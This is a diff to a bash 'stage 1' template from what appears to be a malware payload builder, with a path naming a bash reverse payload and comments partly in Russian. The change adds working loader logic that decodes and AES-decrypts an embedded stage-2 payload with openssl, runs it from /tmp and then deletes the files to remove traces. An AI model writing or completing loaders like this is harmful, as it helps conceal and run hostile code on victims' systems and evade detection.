@@ -1,13 +1,20 @@
-# payloads/linux/bash_reverse/template.sh
-
 #!/bin/bash
 # AES-256-CBC decryptor template for Linux stage 1
-# This file will be populated by build_and_run.sh with decrypted Stage 2
 
-PAYLOAD="REPLACE_AES"  # Format: ivhex:base64cipher
+PAYLOAD="REPLACE_AES"  # encrypted ivhex:base64cipher, вставится на сборке
+KEY="REPLACE_KEY"      # AES ключ, совпадает с .env ENCRYPTION_KEY
 
-# Placeholder — write decrypted payload to a temp file and execute
-TMP=$(mktemp /tmp/.payloadXXXXXX.sh)
-echo "echo '[!] AES decryption logic goes here'" > "$TMP"
-chmod +x "$TMP"
-nohup bash "$TMP" &>/dev/null &
+iv=$(echo "$PAYLOAD" | cut -d: -f1)
+cipher=$(echo "$PAYLOAD" | cut -d: -f2)
+
+# Декодируем base64 в бинарник
+echo "$cipher" | base64 -d > /tmp/cipher.bin
+
+# Расшифровываем с помощью openssl
+openssl enc -d -aes-256-cbc -K $(echo -n $KEY | xxd -p) -iv $iv -in /tmp/cipher.bin -out /tmp/plaintext.sh
+
+# Запускаем payload
+bash /tmp/plaintext.sh
+
+# Удаляем временные файлы
+rm -f /tmp/cipher.bin /tmp/plaintext.sh
